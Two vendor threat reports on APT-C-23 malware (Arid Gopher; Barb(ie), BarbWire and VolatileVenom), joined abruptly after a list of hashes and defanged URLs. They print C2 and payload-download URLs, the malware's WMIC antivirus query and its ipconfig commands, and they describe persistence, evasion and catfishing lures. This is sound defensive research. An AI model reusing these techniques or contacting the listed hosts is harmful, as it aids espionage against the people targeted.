895adb54a13d9ebf3f7215f1bad77c0c548e7dd4c58c3a338d440520efcb8fc9
27eaeb7f0195230e22d5beacc05b7d944aaec4894fbc02824f59b172e360713f
7b9087d91a31d03dd2c235d8debf8ed10f4b82c430a236d159e06e7fb47464a9
aa507bbe5d2a32f6e1e3f311c1baf93fd4707def8596083f26683e85972f5ac0
c9d7b5d06cd8ab1a01bf0c5bf41ef2a388e41b4c66b1728494f86ed255a95d48
0a55551ade55705d4be6e946ab58a26d7cf8087558894af8799931b09d38f3bc
c7e74330440fcf8f6b112f5493769de6cdbdea5944ab78697ab115c927cbd0a1
2d03ff4e5d4d72afffd9bde9225fe03d6dc941982d6f3a0bbd14076a6c890247
e288d7e42c8cdbf0156f008ff7d663f8c8e68faa2e902d51f3287f1bceae79b2
5463b3573451d23f09cb3f6f3c210de182ed0dd8a89459381a7f69aa7f8ac9b4
hxxp://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/ZCgbo9EVhYMA8PX
hxxp://deangelomcnay[.]news/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/bu5EmpJE7DUfzZD
hxxps://cooperron[.]me/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/
hxxps://cooperron[.]me/qWIlIdKf2buIH0k/GbrHoIfRqtE69hH/
hxxps://dorothymambrose[.]live/hx3FByTR5o3zNZYD/sYkaiHz0Mse13C79dy1I/
hxxp://dorothymambrose[.]live/hx3FByTR5o3zNZYD/sYkaiHz0Mse13C79dy1I/
hxxps://nicholasuhl[.]website/X2EYSWlzSZgSUME210Zv/YPPV6kFl2PwwF0TEVHMy/
hxxp://nicholasuhl[.]website/X2EYSWlzSZgSUME210Zv/YPPV6kFl2PwwF0TEVHMy/
hxxps://earlahenry[.]com/Ct2azbEP57LtWgmK/lWaPwemAJ3LPFmDH/
hxxp://earlahenry[.]com/Ct2azbEP57LtWgmK/lWaPwemAJ3LPFmDH/
hxxp://juliansturgill[.]info/um2NxySaF4L5mSYE/KY1hNeVvrE1XCrKP/Executive Summary
Deep Instinct’s Threat Research team has found a new, undocumented malware developed in Golang
The malware is attributed to APT-C-23 (Arid Viper)
Further research revealed additional, previously unseen second-stage payloads
New Malware Variant Discovery: Arid Gopher Our Threat Research team maintains a vigilant watch over the cyber threat landscape, hunting for malware as a normal course of operations. The team recently encountered an executable file written in the Go programming language. The identified file was initially submitted to VirusTotal on December 29, 2021 and was detected by only six security vendors. After initial inspection, two additional similar files written in Go have been found. During the analysis of these files, the team identified a previously unseen variant of Arid Gopher malware; the new unknown malware is a variant of the Micropsia malware, written and used exclusively by APT-C-23 (Arid Viper). Micropsia and Arid Viper This strain of malware was first identified in 2017 by “360 Security,” but later re-named to Micropsia . This malware targets computers running Windows OS. The threat actor behind the Micropsia malware is known by the name APT-C-23 or Arid Viper. This malware has primarily been used to target the Middle East region, with specific interest against Palestinian targets. Arid Viper also has a unique Android malware that has been used against Israeli targets. Arid Viper has been previously linked to the Hamas organization. Both the Windows and Android malware versions are constantly evolving. In April 2021, Facebook (now Meta) published a threat report about Arid Viper. In the report they identified a new iOS malware developed by APT-C-23. Facebook highlighted the specifics of how the threat actor had constantly changed the programming language used for developing the Micropsia malware which included Pascal, Delphi, C++, and even Python. What is Arid Gopher? During our investigation of the three files written in Go, we uncovered a novel variant of the Micropsia malware family written in Go, which we named Arid Gopher. This new variant is still being developed; all the three files share a common baseline, but each file contains unique code which is not present in the other files. Beside the main implant, our investigation revealed a “helper” malware, also written in Go, and a second-stage malware which was downloaded from the C2 server. We provide a brief analysis of all the newly found samples and in-depth analysis of just one of them following. What is Arid Gopher V1? This variant is written in Go 1.16.5gs and contains public code from libraries found on GitHub: Arid Gopher variant contains public code from libraries in GitHub Developing the variant in this manner saves the author time by not needing to write some features from scratch. It also adds some degree of legitimacy because those libraries are not malicious, but the malware author abuses the libraries’ capabilities for malicious purposes. Library Usage
https://github.com/zetamatta/go-windows-shortcut Create Shortcut for persistence.
https://github.com/go-ole/go-ole A dependency of the go-windows-shortcut library.
https://github.com/lxn/win A Windows API wrapper package for the Go Programming Language.
https://github.com/kbinani/screenshot Create screenshots of the infected computer
https://github.com/gonutz/w32 Windows API wrapper for the Go Programming Language.
All of the above libraries also exist in Arid Gopher V2 alongside additional libraries, except for the “go-windows-shortcut” library which has been replaced by another library with similar functionality. The function names in V1 have unique and innocent names such as “infoSchoolManagerAboutRecievingHomeworksDone” and “wakeUpWhatIsInMyBag,” function names have been renamed in V2 to be more generic. This variant is using the domain “grace-fraser[.]site” as a C2. Grace Fraser is the name of a character from HBO TV show “The Undoing.” Arid Viper is known to use many references to TV shows; similar behavior was observed with Arid Gopher V2. The C2 is using the “ Laravel ” framework which was used by Arid Viper in previous campaigns. This variant was uploaded to VirusTotal at the end of August 2021 inside a RAR archive named “تعريف وأهداف ودوافع الاستثمار.xz” from the UAE, which might indicate the region in which the target is located. The practice of sending variants of Micropsia inside archives with the extension “.xz” has been observed several times in Arid Viper campaigns. The filename roughly translates to “definition, objectives, and motives for investment.” In order to trick the user into thinking they are opening an innocent Word document the threat actor uses two masquerading techniques:
First, it uses the Microsoft Word Office document icon.
Second, it uses a very long file name (see image below), preventing the user from seeing the ‘.exe’ file extension.
Arid Gopher File Name Lastly, upon execution of the file, the malware will write a benign decoy office document to the folder “C:\ProgramData\NotificationControllerPS” and will present It to the victim: Arid Gopher Benign Decoy Office Document The combination of those three social engineering elements is intended to fool unsuspecting victims to run the malware and present them with decoy documents as they would expect from opening a Word document. This behavior is consistent in Arid Viper attacks utilizing Micropsia. The decoy document contains sections from an academic publication regarding financial investments. The original article can be found in this link . The malware creates a LNK file and copies it to the startup folder for persistence using the name of the malware executable. System info collection:
The malware writes a base64 blob containing <current_user>_<random_ID> to “C:\ProgramData\NotificationControllerPS\MSAProfileNotificationHandler.txt”
The malware checks for installed Antivirus products by running the following command: cmd /c WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
The function “app_myLib_student_GetFatherName” returns a string containing the OS version, which uses RtlGetVersion() and returns a string such as “Microsoft Windows [version 6.1.7601]”
The malware uses the custom User-Agent “aimxxhwpcc” while sending data to the C2 server. The malware creates a mutex named “ABCMedia”. What is Arid Gopher V2? We found two versions of this variant that had been used in the beginning of 2022. The main difference between the two samples is the decoy content. We will first show the similarities and later will show the difference between the two V2 samples. Those samples are written in Go 1.17.4 and contain some of the public libraries found at V1 and the following libraries: Arid Gopher V2 Libraries Library Usage
https://github.com/bi-zone/wmi Windows Management Instrumentation (WMI) for Go.
https://github.com/bi-zone/go-ole Dependency for the above WMI library.
https://github.com/hashicorp/go-multierror Error handling.
https://github.com/hashicorp/errwrap Error handling.
https://github.com/scjalliance/comshim Ensures that at least one thread within a Go process maintains an initialized connection to the component object model runtime in Windows.
https://github.com/btcsuite/winsvc Windows service library written in Go.
https://github.com/danieloliveira085/autostarter Go library that creates a shortcut to run automatically at startup and supports cross-compilation between Windows and Linux.
https://github.com/GeertJohan/go.rice ( only in PDF sample) Go package that makes working with resources such as html, js, css, images, templates, etc. very easy.
Those samples don’t have the Student/School functions name theme, however, using BinDiff we identified an exact match between functions in V1 & V2: V1 function name V2 function name Functionality
app_myLib_student_GetFatherName DSA2_DSA2PKG_Properties_OS Retrieves OS version using RtlGetVersion()
app_myLib_student_GetStudentName DSA2_DSA2PKG_Properties_Name V1: Generates an identifier based on the %USERNAME%, current time, and random seed
V2: The identifier is made from the hostname and %USERNAME%
app_myLib_driver_DoWhatIsTheDriverWants DSA2_DSA2PKG_Proc_StartCMD Runs “cmd /c <argument>” and retrieves the output
main_CreateMutex DSA2_DSA2PKG_Mutex_CreateMutex Calls kernel!CreateMutexW with the given string
Those samples are using the domain “pam-beesly[.]site” as a C2. Pam Beesly is a yet another name of a character from TV show (The Office) and the same motive has been observed in V1 and older Micropsia variants. The following functions exist in V2 version: Arid Gopher V2 Functions If the process command line doesn’t contain “-st”, then the “main_ExResAndRun” function is called, which extracts the decoy document from the assets of the file using the library bindata . The “SoftTookkitPSA” mutex is attempted to be created and if it fails then os.Exit() is called, terminating the process: Arid Gopher V2 Mutex code As can be seen in the image above the author most likely made a typo: “Tookkit” instead of Toolkit. This mutex ensures there’s only one instance of the malware running. The malware queries WMI for installed AV products. If “360 Total Security” is present, the malware will call the function “main_Reg360” to download and execute a second-stage malware we called “Arid Helper.” A description of “Arid Helper” is provided in a later section of this article. If the computer does not have “360 Total Security” antivirus installed, “main_addST” is called: AridHelper’s AV check The function “main_addST” creates a LNK shortcut named “NetworkBoosterUtilities.lnk” in the Startup folder, which links to the malware full-file path. Arid Gopher V2 LNK persistence code The LNK contains the argument “-st” which is used to start the malware without displaying the decoy document: Arid Gopher: -st argument to start the malware “-st” is most likely a prefix for the word start. In the Delphi variants of Micropsia, the LNK contained the argument “-start” for the same purpose. The function “DSA2_DSA2PKG_STRun_AddSTShortcut” uses the autostarter library to set up the malware persistence in the Startup directory of the running user. Afterwards, the function “main_createMainDir” is called which creates the C:\ProgramData\NotificationControllerPSK directory that will store screenshots and other information collected by the malware. System info collection:
Similar to V1, the malware writes a base64 blob, this time also containing the computer name, in the format <computer_name>_<current_user>_<random_ID> to “C:\ProgramData\NotificationControllerPSK\MSAProfileNotificationHandler.txt”
The malware takes a screenshot and saves it as a PNG file to the same folder mentioned above “C:\ProgramData\NotificationControllerPSK”
The malware (only 3d7d75d66428c55dc81563c3bde5477977fadb3325d0224ef9313da133940077) is executing the following commands:
cmd /c ipconfig /release
cmd /c ipconfig /renew
This is done by calling “cmd.exe,” similar to the WMI query in V1.
The malware checks for installed Antivirus products by running a WMI query. Unlike V1 that used cmd.exe to query WMI, the malware uses the bi-zone WMI imported library by calling a function named “DSA2_DSA2PKG_Properties_AV":
Arid Gopher malware checks for installed antivirus products by running a WMI query
The function “app_myLib_student_GetFatherName” that was present in V1 was renamed to “DSA2_DSA2PKG_Properties_OS”
The function “main_sendBasicInfo” collects the following information about the computer and sends it to the C&C server: Field Name Field Value
ename The asset name containing the name of the decoy .pdf to be opened
en Set to 2
device_name Base64 encoded unique string ID made up of the computer name, running username, and a random string
av Result of the WMI query of the running antivirus product
os OS version, e.g., “Microsoft Windows [Version 10.0.0.1836]
C2 Communication The malware calls “main_sendSH” to save a screenshot using kbinani’s library and sends it to the server. Then, “main_getRequestsAndDoIt” is responsible for a loop which sends GET requests to the C2. The response is a JSON, unmarshalled into a struct named “main.REQ," which has the following definition: Arid Gopher V2: main.REQ definition The C&C server needs to send a response with the following JSON object: Arid Gopher V2 server response with JSON object ID: A number that is used later for C&C commands to build a URL
Type: The name of the command to run
Value: The value of the command
Status: Unused
encoded_file_url: Used in the "d" command as the resource file to download Most of the time an empty array will be sent by the server, which will make the sample wait a random number of seconds until it sends another GET request. Here are the following supported commands (i.e., for the possible “type” field): Type Details
s Takes a screenshot and sends it to the server
c Runs the command in the “value” field in CMD
d If the field “encoded_file_url” is present, download and execute a 2 nd- stage payload from “<C2_address>/<id>/download_app_download-by-id/<encoded_file_url> to the “NotificationControllerPSK” directory
cwr Same as type “c” command, but don’t wait for exit.
ra Run a process with the path supplied in the “value” field
al Uploads the SoftTookkitPSA.txt log file
Differences Between V2 Samples: 3d7d75d66428c55dc81563c3bde5477977fadb3325d0224ef9313da133940077 This variant was uploaded on December 19, 2021 to VirusTotal from Palestine, which might indicate the country in which the target is located, since Arid Viper is known to focus on attacking Palestinian targets. The icon of the malware is the exact same Word Icon that was used in V1. If a victim opens the file, the malware will write a benign decoy office document to the folder “%AppData%\Local\Temp\<random_number>\” and will present It to the victim: Arid Gopher V2: decoy office document opens in %AppData%\Local\Temp\\ folder This document contains content from a Saudi blog named “Almrsal” with information on how to write a formal letter. 5588f6fab387133c21b06f6248259c64260435898edd61866fad50312c2d3b25 This variant was uploaded on January 31, 2022 to VirusTotal inside a RAR archive named “The modified opening session program 29-1-2022_ page -0001.xz” from Palestine, which likely indicates which country the target is located. The practice of sending variants of Micropsia inside archives with the extension “.xz” has been observed with V1, as well as in several others Arid Viper campaigns. The archive was downloaded from the URL “https://filetransfer[.]io/data-package/NDqgYm80/download,” a free file upload service, however it is unknown how the victim(s) receive this URL. ”In the wild” URL containing archive with Arid Gopher V2 variant This file has been observed by security expert “ MalwareHunterTeam ” as suspicious, but no formal attribution has been made. Unlike V1 and the previous V2 sample, this variant has a PDF icon. The malware executable inside the archive contains a double extension “The modified opening session program 29-1-2022_page-0001 98656456363546 4565546454645 98984938493854 pdf .exe” The usage of double extensions, specifically “pdf.exe” with a combination of a long filename, has been observed in previous Arid Viper campaigns. If the victim is opening the file, the malware will write a benign decoy PDF document named “The modified opening session program 29-1-2022_page-0001 98656456363546 4565546454645 98984938493854.pdf” to the folder “%TEMP%\<current_date_and_time>” and will present It to the victim: Arid Gopher V2: document meeting summary of Palestinian National Council The document contains an official meeting summary of the Palestinian National Council. Additional 2 nd Stage Payloads Arid Helper:
During the analysis of the V2 sample we noticed that if the WMI query for installed security products returns “360 total security” then the malware will call an additional function instead of “main_addST” as can be seen in Figure 10. The function “main_addST” is responsible for creating the LNK shortcut as we described in V2 analysis. However, if “360 total security” is found to be installed, the malware calls a function named “main_Reg360.” This function then calls another function named “main_DownReqApp” which downloads additional payload from the C2 server from the following URL: “http[:]//pam-beesly[.]site/J2FWAHfmgH573SUB/download_app/download-by-name/SystemNetworkEventsNotification” The file is saved as “C:\ProgramData\NotificationControllerPSK\SystemNetworkEventsNotification.txt”. Afterwards, a function named “DSA_DSA2PKG_FileByte_DecodeByte” is called to convert the downloaded file into an executable named “C:\ProgramData\NotificationControllerPSK\SystemNetworkEventsNotification.exe” and the text file is being deleted. The final executable is also written in Go language and its’ sole purpose appears to be to create an alternative persistence mechanism in case “360 total security” is installed. As a side note, 360 Total Security were the first to publish about the Windows malware which was later named Micropsia that Arid Viper continues to develop and improve. This “helper” executable can receive the following parameters:
v=<PersistenceName> - Creates a registry run key with the given value name.
d=<PathToExecutable> - Sets the registry value to the path provided
-st - Unused
-old - Unused The executable will use the Golang App Shutdown Hooks library , and set a shutdown hook that will add a run key with the parameters used to set persistence. A shutdown hook function is called when the process receives an event for termination. Since the console for the process is hidden, it is in high likelihood that the intention of this executable is to add a registry run key when the computer shuts down. Additional Second Stage Payload: While analyzing the traffic from the V2 variant, we noticed that at some point a URL that was returning an empty JSON response started to respond with data. The URL was called from the “main_getRequestsAndDoIt” function. At one point, the URL returned a base64 blob, which when decoded, revealed another executable file: PE information for the second stage malware This sample is not written in Go, but in Visual C++ and was compiled on February 14, 2021. It uses mozelllittel[.]com as a C2. The C2 uses the Laravel framework, which is also used in other Arid Viper C2 servers. The sample also creates an LNK in startup for persistence, like the Gopher variants. This sample doesn’t display any decoy documents. We will provide a further analysis of this sample in another blog post. Conclusion Most current cybersecurity products fail to detect new malware and APTs (Advanced Persistent Threats) because they rely on manually tuned heuristics. More advanced solutions use manually selected features, which are then fed into classical machine learning modules to classify the file as malicious or legitimate (and even then, the malware detection rates are quite poor). Several methods rely on running the malware in a sandbox environment to obtain more information. While this allows for more accurate detection, it comes at the cost of protection because it’s a very time-intensive process and will not prevent threats from executing. The Deep Instinct Prevention Platform stops known, unknown, and zero-day threats with the highest accuracy and lowest false-positive rate in the industry. We stop attacks before they happen, identifying malicious files in <20ms, before execution. Deep Instinct prevents >99% of unknown threats faster and with greater efficacy than existing EPP and EDR solutions, ensuring malware never enters your environment. Deep Instinct is built on a first-of-its-kind deep learning cybersecurity framework inspired by the brain’s ability to learn. Once a brain learns to identify an object, its identification becomes second nature. When applied to cybersecurity, deep learning facilitates new predictive capabilities of detecting, with unmatched accuracy, any type of cyber threat, including never-before-seen malware as described in this blog. Deep Instinct customers are protected against the variants of Micropsia described in this blog, as well as other unknown, never-before-seen malicious threats. If you’d like to see the platform in action for yourself, we’d be honored to show you what true prevention looks like. Please request a demo . Indicators of Compromise SHA256 Description
f01c07f88071c8f71514db19f68c966f17ac8af0d3288913141714037352c99c Archive containing AridGopher V1
99544057a5215e756b67aa47815e27dc157eb850792e5eacda6796922bb9a50b AridGopher V1
42492efa48785ca118d4b05f28570e7b6be4677a962cb7825a859ad5e3045710 Archive containing AridGopher V2 (PDF)
5588f6fab387133c21b06f6248259c64260435898edd61866fad50312c2d3b25 AridGopher V2 (PDF)
3d7d75d66428c55dc81563c3bde5477977fadb3325d0224ef9313da133940077 AridGopher V2 (Word)
fa257cca88522e76a7dc4a10311f739d17587f25fe447ae2b4c84027f2246705 AridHelper
57674d0ed1e03807ad9d53a9087388b1b9bf6e9e5d120dbe834730affebe2675 2 nd stage malware
Domain Description
grace-fraser[.]site AridGopher V1 C2
pam-beesly[.]site AridGopher V2 C2
mozelllittel[.]com 2 nd stage C2
Indicators of Attack Folders:
C:\ProgramData\NotificationControllerPS
C:\ProgramData\NotificationControllerPSK User-Agent:
aimxxhwpcc Mutex:Over the last several years, the Cybereason Nocturnus Team has been tracking different APT groups operating in the Middle East region, including two main sub-groups of the Hamas cyberwarfare division: Molerats and APT-C-23 . Both groups are Arabic-speaking and politically-motivated that operate on behalf of Hamas , the Palestinian Islamic-fundamentalist movement and a terrorist organization that has controlled the Gaza strip since 2006.
While most of the previously reported APT-C-23 campaigns seemed to target Arabic-speaking individuals in the Middle East, Cybereason recently discovered a new elaborate campaign targeting Israeli individuals, among them, a group of high-profile targets working for sensitive defense, law enforcement, and emergency services organizations.
The campaign operators use sophisticated social engineering techniques, ultimately aimed to deliver previously undocumented backdoors for Windows and Android devices. The goal behind the attack was to extract sensitive information from the victims devices for espionage purposes.
Our investigation reveals that APT-C-23 has effectively upgraded its malware arsenal with new tools, dubbed Barb(ie) Downloader and BarbWire Backdoor, which are equipped with enhanced stealth and a focus on operational security. The new campaign that targets Israeli individuals seems to have a dedicated infrastructure that is almost completely separated from the known APT-C-23 infrastructure which is assessed to be more focused on Arabic-speaking targets.
Key Findings
New Espionage Campaign Targeting Israelis: Cybereason discovered a new and elaborate campaign that targets Israeli individuals and officials. The campaign is characterized as an espionage campaign aiming to steal sensitive information from PCs and mobile devices belonging to a chosen target group of Israeli individuals working for law enforcement, military and emergency services.
Attribution to APT-C-23: Based on our investigation and previous knowledge of the group, Cybereason assesses with moderate-high confidence that the group behind the new campaign is APT-C-23, an Arabic-speaking, politically motivated group believed to be operating on behalf of Hamas.
Social Engineering as Primary Infection Vector: The attackers used fake Facebook profiles to trick specific individuals into downloading trojanized direct message applications for Android and PC, which granted them access to the victims’ devices.
Upgraded Malware Arsenal: The new campaign consists of two previously undocumented malware, dubbed Barb(ie) Downloader and BarbWire Backdoor , both of which use an enhanced stealth mechanism to remain undetected. In addition, Cybereason observed an upgraded version of an Android implant dubbed VolatileVenom .
APT-C-23 Stepping Up Their Game: Until recently, the group has been using known tools which served them for years, and were known for their relatively unsophisticated tools and techniques. The analysis of this recent campaign shows that the group has revamped their toolset and playbook.
Luring the Victims: A Wolf in a Beauty’s Clothing
To get to their targets, APT-C-23 has set up a network of fake Facebook profiles that are highly maintained and constantly interacting with many Israeli citizens. The social engineering tactic used in this campaign relies mostly on classic catfishing , using fake identities of attractive young women to engage with mostly male individuals to gain their trust.
These fake accounts have operated for months, and seem relatively authentic to the unsuspecting user. The operators seem to have invested considerable effort in “tending” these profiles, expanding their social network by joining popular Israeli groups, writing posts in Hebrew, and adding friends of the potential victims as friends:
Fake Facebook account operated by APT-C-23
In order to give the profiles an even more authentic appearance, the group uses the accounts to “like” various Facebook groups and pages that are well known to Israelis, such as Israelis news pages, Israeli politicians’ accounts and corporate pages:
Liked profiles showed on the above mentioned Facebook page
Over time, the operators of the fake profiles were able to become “friends” with a broad spectrum of Israeli citizens, among them some high-profile targets that work for sensitive organizations including defense, law enforcement, emergency services and other government-related organizations:
Some Facebook accounts that interacted with the fake account and their workplace
Another example of a fake profile used by APT-C-23 in this campaign, is the following:
Fake Facebook account operated by APT-C-23
From Chat to Infection
After gaining the victim’s trust, the operator of the fake account suggests migrating the conversation from Facebook over to WhatsApp. By doing so, the operator quickly obtains the target's mobile number. In many cases, the content of the chat revolves around sexual themes, and the operators often suggest to the victims that they should use a “safer” and more “discrete” means of communication, suggesting a designated app for Android.
In addition, they also entice the victims to open a .rar file containing a video that supposedly contains explicit sexual content. However, when the users open the video they are infected with malware.
The following diagram captures the flow of the infection:
The VolatileVenom Malware: A supposedly “secure” and “confidential” Android messaging application.
The Barb(ie) Downloader: A link to a site “hxxps://media-storage[.]site/09vy09JC053w15ik21Sw04” downloads a .rar file that contains a private video and the BarbWire Backdoor payload:
Graph that describes the initial infection chain of the campaign
Stage One: Barb(ie) Downloader
Barb(ie) is a downloader component used by APT-C-23 to install the BarbWire backdoor. As mentioned above, in the infection phase the downloader is delivered alongside a video in a .rar file. The video is meant to distract the victim from the infection process that is happening in the background.
The downloader sample analyzed in this section is named “Windows Notifications.exe” . When first executed, Barb(ie) decrypts strings using a custom base64 algorithm that is also used in the BarbWire backdoor. Those decrypted strings are different Virtual Machine vendor names, WMI queries, command and control (C2), file and folders names which are used in different phases of the execution.
One way the malware uses those strings is in performing multiple checks, such as anti-vm and anti-analysis checks, in order to determine that “the coast is clear.” If the check fails, a custom pop-up message is displayed to the user and the malware terminates itself:
Custom pop-up displayed to user before terminating process: “Unable to start program 'http:/localhost:60721/”
If the malware finds the target machine to be clean and it doesn’t detect any sandboxing or other analysis being performed on the targeted device, the malware will continue its execution and collect information about the machine, including username, computer name, date and time, running processes and OS version.
Later, the malware will attempt to create a connection to the embedded C2 server: fausto-barb[.]website . When creating the connection, the malware sends information about the victim machine that is composed of the data collected. In addition, it sends other information to the C2, like the OS version, downloader name and compilation month (“windowsNotification” + “092021”) as well as information on any installed Antivirus software running:
C2 server for Barb(ie) downloader
Data sent back to the C2 over http
Barb(ie) will attempt to download the payload by using the following URI: “/api/sofy/pony”:
URI structure for Barb(ie) downloader
In addition, the downloader creates a file named “adbloker.dat” that stores the encrypted C2, copies itself to programdata and sets persistence via two scheduled tasks: “01” and “02”.
Interestingly, another Barb(ie) sample that was analyzed with a different name (“Windows Security.exe”) copies itself to appdata as well, but renames the executable to “Windows Notifications.exe” and sets the same persistence:
Two scheduled tasks created by Barb(ie) downloader for persistence
Execution of the Barb(ie) downloader as shown in the Cybereason XDR Platform
Looking at the metadata of Windows Notifications.exe , it appears that the author of the malware chooses a unique company name and product name that do not exist as part of Windows: “Windows Security Groups” as the company name, and “Windows Essential” as product name:
Metadata of the Barb(ie) downloader as shown in the Cybereason XDR Platform
Once a successful connection has been established with the C2, Barb(ie) will download the payload, the BarbWire backdoor.
BarbWire Backdoor
Background and Capabilities
The backdoor component of APT-C-23’s operation is a very capable piece of malware, and it is obvious that a lot of effort was put into hiding its capabilities using a custom base64 algorithm. Its main goal is to fully compromise the victim machine, gaining access to their most sensitive data. The backdoor’s main capabilities include:
Persistence
OS Reconnaissance
Data encryption
Keylogging
Screen capturing
Audio recording
Download additional malware
Local/external drives and directory enumeration
Steal specific file types and exfiltrate data
Variants
According to the timeline of this operation, there are at least three different variants of the BarbWire backdoor. In addition to the compilation timestamp, there is the “sekop” flag that is used as an identifier for a currently running campaign. It is worth mentioning that the variant that was allegedly compiled in December 2021, still carries the Sep 2021 identifier, perhaps meaning that the Sep 2021 campaign was still ongoing for at least two months:
Initial Execution and Victim Host Profiling
The BarbWire persistence techniques include the creation of a scheduled task and also the implementation of a known Process protection technique:
Process protection implementation
The malware handles two execution scenarios; If it is being executed from a location that is other than %programdata%, the malware copies itself to %programdata%\WMIhosts and creates a scheduled task:
The operative path of the BarbWire Backdoor
The scheduled task created by the malware
According to a second execution scenario, where the file already operates from %appdata%, the malware starts collecting user information and gathering OS information including:
PC name
Username
Process architecture
WMI query to check installed AV products
In order to hide the malware’s most sensitive strings, which can disclose its capabilities and communication patterns, it uses a custom-built base64 algorithm.
After successful C2 decryption, the BarbWire backdoor initiates a connectivity check using Google’s domain, and then connects with the C2:
Connectivity check code snippet
It is worth noting that the URIs are in the same format as in the Barb(ie) downloader analyzed above, and other related files pivoted in this research:
One of the generated URLs with the same pattern as the downloader
Once the initial information is gathered on the victim’s OS and the connectivity check is completed, the BarbWire Backdoor finally initiates the connection with the C2 through a POST request:
Initial POST packet with information on the victim’s machine
The data that is sent in the POST request includes:
Data Collection and Exfiltration
The BarbWire backdoor can steal a wide range of file types, depending on the instructions it receives from its operators. It specifically looks for certain file extensions such as PDF files, Office documents, archives, videos, and images.
In addition to the local drives found on the host, it also looks for external media such as a CD-Rom drive. Searching for such an old media format, together with the file extensions of interests, could suggest a focus on targets that tend to use more “physical” formats to transfer and secure data, such as military, law enforcement, and healthcare:
Searching for a CD-Rom drive presence
BarbWire stores the data it collects from the host on special folders it creates under %programdata%\Settings where it stores the collected data from the machine. Each stolen “type” (i.e. keylogged data,screen capture data etc.) has its own resource “code name” in the C2, appended to the previously generated user id:
Below is a table summarizing each folder and its main role:
Staging data in a RAR archive and exfiltration, download additional payloads, volumes and documents of interest enumeration
Folders created by the BarbWire Backdoor
Once the data is being staged and exfiltrated, the data is archived in a .rar file and sent to the C2 to a designated URI:
Exfiltration of archive data
As detailed in the beginning of the analysis, the backdoor also has keylogging and screen capturing data-stealing capabilities. Both are being stored in an interesting way, applying unrelated extensions to the files containing the stolen data. This is perhaps another stealth mechanism, or just a way for the attacker to distinguish between the different stolen data types:
Stolen keylogging data
A screenshot taken by the malware and saved with an .iso extension
VolatileVenom Android Implant Analysis
VolatileVenom is one of APT-C-23’s arsenal of Android malware. The attackers lure the victims into installing the VolatileVenom under the pretext that the suggested app is more “secure” and “discrete.” Based on our investigation, it seems that VolatileVenom has been operationalized and integrated into the group's arsenal since at least April of 2020 , and disguises itself using icons and names of chat applications:
Additional Icons of VolatileVenom disguised as messaging apps
An example of a fake messaging app used in this campaign, is an Android app named “Wink Chat”:
Start-up screen of the app
After the user attempts to sign up for the application, an error message pops up and indicates the app will be uninstalled:
Error message after sign-up
However, in reality the application keeps running in the background, and if the Android version of the device is lower than 10, the application icon is hidden. If the Android version is higher than Android 10, the application icon is then replaced with the icon of Google Play installer. The attackers have the option to change the application icon to Google Chrome or Google Maps as well.
Capabilities
VolatileVenom has a rich set of espionage capabilities, which enable attackers to extract a lot of data from their victims.
The main espionage capabilities are the following:
Steal SMS messages
Read contact list information
Use the device camera to take photos
Steal files with the following extensions: pdf, doc, docs, ppt, pptx, xls, xlsx, txt, text
Steal images with the following extensions: jpg, jpeg, png
Record audio
Use Phishing to steal credentials to popular apps such as Facebook and Twitter
Discard system notifications
Get installed applications
Restart Wi-Fi
Record calls / WhatsApp calls
Extract call logs
Download files to the infected device
Take screenshots
Read notifications of the following apps: WhatsApp, Facebook, Telegram, Instagram, Skype, IMO, Viber
Discards any notifications raised by the system
C2 Communication
VolatileVenom uses HTTPS and Firebase Cloud Messaging (FCM) for C2 communication. The application appears to have two methods to retrieve the C2 domain:
First the malware decrypts a hard coded encrypted domain which is encrypted and encoded with AES and Base64. The encrypted domain is retrieved from a .so (shared object) file. The app loads the .so file (named “ liboxygen.so ” in the analyzed sample) , and executes a function (named “ do932()” in the analyzed sample) that returns the encrypted domain:
The malware loads the .so file
The encrypted hard-coded domain inside the .so file
Next, the encrypted domain is decoded and decrypted. In the analyzed sample, the encrypted domain is “https://sites.google[.]com/view/linda-lester/lockhart”:
Code snippet of the decryption routine
To retrieve the final C2 domain, the malware connects to the decrypted domain and reads the title of the website (ex: FRANCES THOMAS COM) and builds the final C2 domain from that: frances-thomas[.]com:
The malware builds the final C2 domain from the title of the decrypted domain
The second method the malware retrieves the C2 domain is via SMS messages. In case the attackers wish to update the C2 domain, they may send an SMS message containing a new C2 domain to the infected device. The malware intercepts every SMS message, and if a message arrives from the attackers, the malware will extract the new C2 domain to be used:
Regex to extract domains from SMS messages
Conclusion
In this report, the Cybereason Nocturnus Team investigated an active espionage campaign that victimizes Israeli citizens, among them high profile targets, for espionage purposes. The campaign featured a classic social engineering tactic known as catfishing, where the group used sexual content in order to lure their victims, mostly Israeli men, into downloading malware.
Cybereason assesses with moderate-high confidence that APT-C-23, a politically-motivated APT group that operates on behalf of Hamas, is behind the campaign detailed in this report. While the APT-C-23 operations against Arab-speaking targets (mostly Palestinians) are still taking place, this newly identified campaign specifically targets Israelis and shows unique characteristics that distinguish it from other campaigns. The attackers use a completely new infrastructure that is distinct from the known infrastructure used to target Palestinians and other Arabic-speakers. In addition, all three malware in use were also specifically designed to be used against Israeli targets, and were not observed being used against other targets.
The Cybereason investigation found that some victims were infected with both PC and Android malware dubbed Barb(ie) Downloader , BarbWire Backdoor , and VolatileVenom . This “tight grip” on their targets attests to how important and sensitive this campaign was for the threat actors.
Lastly, this campaign shows a considerable step-up in APT-C-23 capabilities, with upgraded stealth, more sophisticated malware, and perfection of their social engineering techniques which involve offensive HUMINT capabilities using a very active and well-groomed network of fake Facebook accounts that have been proven quite effective for the group.
Cybereason contacted Facebook and reported the fake accounts.
Indicators of Compromise
LOOKING FOR THE IOCs? CLICK ON THE CHATBOT DISPLAYED IN LOWER-RIGHT OF YOUR SCREEN FOR ACCESS OR CLICK HERE .
MITRE ATT&CK BREAKDOWN
Indicators of Compromise (IOCs): Operation Bearded Barbie - APT-C-23 Campaign
Barb(ie) Downloader
Hashes
e58b6be462d9c32a140485069ea5ab6e1f68bfa5ca639338b2361447076ca046
1391fc71b88b027fc29536dbebf29859aae1a7a8fc3121e02ae69a0909c147a9
b59091e84ab7d612a3c19a87802e834afb8893f2d5a957727e2ae7aa7b5fdb50
b9f967e263dad9b08c19b5f2933fc71047d194d0c495058a0a54c8de11ce5d60
C2 fausto-barb[.]website
BarbWire Backdoor:
Hashes
b1c604ca3cf3a17de9e182722a20e5381b255203d7a80ab7c18a6cf9439551d1
